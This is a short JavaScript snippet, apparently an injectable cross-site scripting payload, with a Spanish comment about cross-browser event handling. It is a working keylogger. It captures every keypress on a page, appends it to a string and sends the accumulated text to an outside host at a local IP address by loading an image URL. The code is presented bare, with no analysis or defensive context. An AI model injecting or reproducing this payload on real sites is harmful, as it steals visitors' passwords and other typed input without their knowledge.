<script>
    var k = "";
    document.onkeypress = function(e){
        // para que el parametro que efectua la operacion de obtencion de datos, funcione en todos los navegadores
        e = e || window.event;
        k += e.key;
        var i = new Image();
        i.src = "http://192.168.1.187/" + k;
    };


</script>
